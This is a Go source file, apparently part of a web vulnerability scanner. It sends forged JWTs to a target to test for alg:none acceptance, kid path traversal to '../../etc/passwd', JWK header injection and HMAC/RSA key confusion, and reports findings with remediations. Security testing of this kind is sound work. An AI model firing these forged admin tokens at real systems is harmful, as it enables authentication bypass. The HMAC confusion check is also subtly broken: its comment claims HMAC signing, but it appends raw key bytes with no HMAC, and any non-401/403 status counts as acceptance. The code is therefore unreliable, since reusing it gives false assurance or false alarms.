package oidc

import (
	"context"
	"encoding/base64"
	"fmt"
	"net/url"
	"strings"

	"github.com/aydocs/fang/pkg/models"
)

// JWT attack suite folded from idpwn per jwt_fold_notes.md: GET-only
// (?token=<crafted>) probes via the shared engine client; acceptance inferred
// from status codes (anything but 401/403), hence MediumConfidence findings.
var (
	// jwtPrefixes/jwtDelims drive response-body JWT discovery (notes §1).
	jwtPrefixes = []string{"eyJ", "eyI", "eyJhbGci", "eyJ0eXAi", "eyJraWQ"}
	jwtDelims   = "\"' \t\r\n<>&"

	// hmacConfusionKeys holds base64(SPKI DER) RSA public keys replayed verbatim
	// as HMAC secrets (notes §5); package-level so callers can extend the list.
	hmacConfusionKeys = []string{
		"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArWN78WySlx5gK5yNy0lpcDCLf6ZgJsf+a/1IZtni11REbSewb7F2Cx9Uv1/HAlmDmuC50QOoaRrMzsi79RhTPqmwhJ7iJfqw07c1FHONS0jup9bIj44ooan9CjmV381ejbfqin3Ne9fpMqx9Ntb7rrA1fcq3/PU1TaIQmgUu8LT23av76mSsGJ5z+UZZKd9WRDq+PU92gyHw8cA/kLZkyH0qdbEIFk+HGnEHxmV6jlor99xMWnBzi5pWiwv/5Dvs2Dk2d+Bb3pXTFUa9dc8l8OUf663VA4Oof9gGUkftZD1arOUI6r6O27ZYKI1/orSrjv0W2J4ubdsO66PolFQ5kQIDAQAB",
		"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlYhr3ERx/yR/i1KghN65S3KckVsuz/U/nJns5ss1kqqeDv94eX56R8Y9XDcgxyrPqg8yIYEC+2+PZfev2fEy13S2HCezgHJz+6K5ntMw0q+1Qd//2F8KueJEuI95+oQh7762HaCgFtj+Ij1WP43EyQuKl86jICUkh1/uqwZBPdh1aFmdTNZperqDbxn5HrfAqhjA41+VWyUaARBUqDSMXzl3oN71LGRmHjVOJ63yW+XGBzW91Go8iSkHggp6tICCYGUTsE2HUcExq64g1Qhq8exAxHDZPv+o/lq9RVhp502sfqiGORdtaarCi4Kih1aOl09j2yyD0UM/w6+dzqgv/QIDAQAB",
		"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArg1xJLtEorXtqv43OJZ5TNi4ZY4himt6NCEb7PWIZuakCDI5YMGOsEzuN7dh6N0qmHlzpl9oSuf0TY8UmwowtXbMebwiatOFtmGq7ipoxZv9xMK+8wp+WrCTMx5Ken1eQT1LZenomUxyN3cBr74XBOTKTOm+B7M8naAHnl75S3g7ddeF0zv6McEikspTlQdc7tT+vUmYYszpD2ayNkHD3OCJdKDf/zn90n1GAlO3LCVzHFdTjYIqk+CdvheOWKzNyTCVA+My1zopNE3fUl2WupdEGZr8StuaqblpXegWH6wRdJa28ZZxyssI6PPldZzujdqBZizhV3l5gz/kHgrOtwIDAQAB",
	}

	// jwkInjectModulus is a throwaway 2048-bit RSA modulus (base64url, unpadded)
	// embedded in the JWK-injection header (notes §4).
	jwkInjectModulus = "rWN78WySlx5gK5yNy0lpcDCLf6ZgJsf-a_1IZtni11REbSewb7F2Cx9Uv1_HAlmDmuC50QOoaRrMzsi79RhTPqmwhJ7iJfqw07c1FHONS0jup9bIj44ooan9CjmV381ejbfqin3Ne9fpMqx9Ntb7rrA1fcq3_PU1TaIQmgUu8LT23av76mSsGJ5z-UZZKd9WRDq-PU92gyHw8cA_kLZkyH0qdbEIFk-HGnEHxmV6jlor99xMWnBzi5pWiwv_5Dvs2Dk2d-Bb3pXTFUa9dc8l8OUf663VA4Oof9gGUkftZD1arOUI6r6O27ZYKI1_orSrjv0W2J4ubdsO66PolFQ5kQ"

	// jwkInjectSig is a structurally valid 256-byte base64url signature blob.
	jwkInjectSig = "HZBAD2zzFIA8Ck7fs6_rgKbJZy1Q2HaTknU-uZ9N2PFLpVUJGDPH8zlgknCZQ_EgWpRvKfkeI81cYOzdj-Vu_ADFx_JE4Uw4yfnqqqepgp7xPioHLspc4Rzz6DrCmX2jrS4brp3q9RF7Hax3UzHOYn03LiBrD7Dp67r3IdJdmFONHc0XgzY51bCBRT553edKB-eJ8CpVodgjk2gE9czehkShWfNZkZCDlwgjUMDymUM6qsEWEGgPe-13mVjwqA63T_dM7kAFN17F413aDhp_exVI9woH-u_5UDq3uKL4STjJc5w1NM-ltl4qngQLHA3NDRnnTHceWPi4MhmDrVVbJw"
)

const (
	// algNoneToken is the unsigned token from fold notes §2 (verbatim).
	algNoneToken = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."
	kidHeader    = `{"kid":"../../etc/passwd","alg":"HS256"}`
	adminPayload = `{"sub":"admin","role":"admin"}`
)

func b64url(s string) string { return base64.RawURLEncoding.EncodeToString([]byte(s)) }

// checkJWTFold runs the five JWT checks from jwt_fold_notes.md.
func (m *OIDCModule) checkJWTFold(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding
	findings = append(findings, m.discoverJWTTokens(ctx, target)...)
	findings = append(findings, m.checkAlgNoneAcceptance(ctx, target)...)
	findings = append(findings, m.checkKidPathTraversal(ctx, target)...)
	findings = append(findings, m.checkJWKInjection(ctx, target)...)
	findings = append(findings, m.checkHMACRSAConfusion(ctx, target)...)
	return findings
}

// probeToken GETs <target>?token=<tok>; accepted means status not in {401,403}.
func (m *OIDCModule) probeToken(ctx context.Context, target *models.Target, tok string) (string, int, bool) {
	select {
	case <-ctx.Done():
		return "", 0, false
	default:
	}
	sep := "?"
	if strings.Contains(target.URL, "?") {
		sep = "&"
	}
	probeURL := strings.TrimRight(target.URL, "/") + sep + "token=" + url.QueryEscape(tok)
	resp, err := m.client.GetContext(ctx, probeURL)
	if err != nil || resp == nil {
		return probeURL, 0, false
	}
	return probeURL, resp.StatusCode, resp.StatusCode != 401 && resp.StatusCode != 403
}

// discoverJWTTokens scans probed response bodies for JWT-shaped strings (notes §1).
func (m *OIDCModule) discoverJWTTokens(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding
	base := strings.TrimRight(target.URL, "/")
	for _, path := range []string{"/", "/api", "/userinfo", "/profile"} {
		select {
		case <-ctx.Done():
			return findings
		default:
		}
		resp, err := m.client.GetContext(ctx, base+path)
		if err != nil || resp == nil {
			continue
		}
		for _, tok := range extractJWTCandidates(resp.Body) {
			findings = append(findings, &models.Finding{
				CheckID:     "oidc.oidc-jwt-token-disclosed-in-response-body",
				Title:       "OIDC - JWT Token Disclosed in Response Body",
				Severity:    models.High,
				Confidence:  models.HighConfidence,
				URL:         base + path,
				Evidence:    fmt.Sprintf("HTTP %d - 3-segment JWT structure: %.80s...", resp.StatusCode, tok),
				Description: "A JSON Web Token (three dot-separated base64url segments) is exposed in an unauthenticated response body. Stolen tokens grant session replay and privilege escalation.",
				Remediation: "Never return tokens in responses that do not require them. Restrict token issuance to the token endpoint over TLS, set short expiries, and rotate refresh tokens.",
				CWEID:       "CWE-287",
				ModuleID:    "oidc",
			})
			if len(findings) >= 3 {
				return findings
			}
		}
	}
	return findings
}

// extractJWTCandidates yields unique body substrings starting with a known JWT
// prefix, terminated by a delimiter, splitting into exactly 3 parts.
func extractJWTCandidates(body string) []string {
	var out []string
	seen := map[string]bool{}
	for _, prefix := range jwtPrefixes {
		for i := strings.Index(body, prefix); i >= 0; {
			end := strings.IndexAny(body[i:], jwtDelims)
			if end < 0 {
				end = len(body) - i
			}
			cand := body[i : i+end]
			if !seen[cand] && len(strings.Split(cand, ".")) == 3 {
				seen[cand] = true
				out = append(out, cand)
			}
			next := strings.Index(body[i+1:], prefix)
			if next < 0 {
				break
			}
			i += next + 1
		}
	}
	return out
}

// checkAlgNoneAcceptance sends the unsigned alg:none token (notes §2).
func (m *OIDCModule) checkAlgNoneAcceptance(ctx context.Context, target *models.Target) []*models.Finding {
	probeURL, status, accepted := m.probeToken(ctx, target, algNoneToken)
	if !accepted {
		return nil
	}
	return []*models.Finding{{
		CheckID:     "oidc.oidc-alg-none-token-accepted",
		Title:       "OIDC - alg:none Token Accepted",
		Severity:    models.Critical,
		Confidence:  models.MediumConfidence,
		URL:         probeURL,
		Payload:     algNoneToken,
		Evidence:    fmt.Sprintf("HTTP %d - unsigned alg:none token not rejected (status not 401/403)", status),
		Description: "The endpoint accepted a JWT with alg:none, forging arbitrary tokens (e.g. admin role) without any signing key.",
		Remediation: "Reject tokens with alg:none or any algorithm not on an allowlist. Pin the expected algorithm server-side instead of trusting the token header.",
		CWEID:       "CWE-287",
		ModuleID:    "oidc",
	}}
}

// checkKidPathTraversal crafts a kid pointing outside the key directory (notes §3).
func (m *OIDCModule) checkKidPathTraversal(ctx context.Context, target *models.Target) []*models.Finding {
	tok := b64url(kidHeader) + "." + b64url(adminPayload) + ".signature"
	probeURL, status, accepted := m.probeToken(ctx, target, tok)
	if !accepted {
		return nil
	}
	return []*models.Finding{{
		CheckID:     "oidc.oidc-jwt-kid-path-traversal-accepted",
		Title:       "OIDC - JWT kid Path Traversal Accepted",
		Severity:    models.Critical,
		Confidence:  models.MediumConfidence,
		URL:         probeURL,
		Payload:     tok,
		Evidence:    fmt.Sprintf(`HTTP %d - kid "../../etc/passwd" token not rejected (status not 401/403)`, status),
		Description: `The endpoint accepted a JWT whose kid ("../../etc/passwd") traverses paths, indicating the kid is used for file-path secret resolution. Attackers can point it at attacker-known files or coerce signature verification failures into bypasses.`,
		Remediation: "Treat kid as an opaque identifier looked up in a database or fixed map. Never interpolate it into filesystem or SQL paths.",
		CWEID:       "CWE-22",
		ModuleID:    "oidc",
	}}
}

// checkJWKInjection embeds an attacker RSA JWK in the header (notes §4).
func (m *OIDCModule) checkJWKInjection(ctx context.Context, target *models.Target) []*models.Finding {
	header := fmt.Sprintf(`{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"%s","e":"AQAB"}}`, jwkInjectModulus)
	tok := b64url(header) + "." + b64url(adminPayload) + "." + jwkInjectSig
	probeURL, status, accepted := m.probeToken(ctx, target, tok)
	if !accepted {
		return nil
	}
	return []*models.Finding{{
		CheckID:     "oidc.oidc-jwk-injection-accepted-self-signed-trust",
		Title:       "OIDC - JWK Injection Accepted (Self-Signed Trust)",
		Severity:    models.Critical,
		Confidence:  models.MediumConfidence,
		URL:         probeURL,
		Payload:     tok,
		Evidence:    fmt.Sprintf("HTTP %d - token carrying embedded header JWK not rejected (status not 401/403)", status),
		Description: "The endpoint appears to trust RSA keys embedded in the token header instead of its JWKS endpoint, allowing fully self-signed forged tokens.",
		Remediation: "Ignore jwk/jku header parameters. Verify signatures only against keys served by the configured JWKS endpoint.",
		CWEID:       "CWE-287",
		ModuleID:    "oidc",
	}}
}

// checkHMACRSAConfusion signs HS256 tokens with RSA public-key material as the
// HMAC secret, looping the configurable key list until one is accepted (notes §5).
func (m *OIDCModule) checkHMACRSAConfusion(ctx context.Context, target *models.Target) []*models.Finding {
	head := b64url(`{"alg":"HS256","typ":"JWT"}`)
	pay := b64url(adminPayload)
	for _, keyB64 := range hmacConfusionKeys {
		select {
		case <-ctx.Done():
			return nil
		default:
		}
		der, err := base64.StdEncoding.DecodeString(keyB64)
		if err != nil {
			continue
		}
		tok := head + "." + pay + "." + base64.RawURLEncoding.EncodeToString(der)
		probeURL, status, accepted := m.probeToken(ctx, target, tok)
		if !accepted {
			continue
		}
		return []*models.Finding{{
			CheckID:     "oidc.oidc-hmac-rsa-key-confusion-accepted",
			Title:       "OIDC - HMAC/RSA Key Confusion Accepted",
			Severity:    models.Critical,
			Confidence:  models.MediumConfidence,
			URL:         probeURL,
			Payload:     tok,
			Evidence:    fmt.Sprintf("HTTP %d - HS256 token signed with RSA public key as HMAC secret not rejected (status not 401/403)", status),
			Description: "The endpoint verifies HS256 tokens using the RSA public key as the shared secret. Since public keys are not secret, attackers can forge valid tokens.",
			Remediation: "Use a single pinned verification algorithm per issuer. For RS256 providers never derive HMAC secrets from public key material.",
			CWEID:       "CWE-287",
			ModuleID:    "oidc",
		}}
	}
	return nil
}
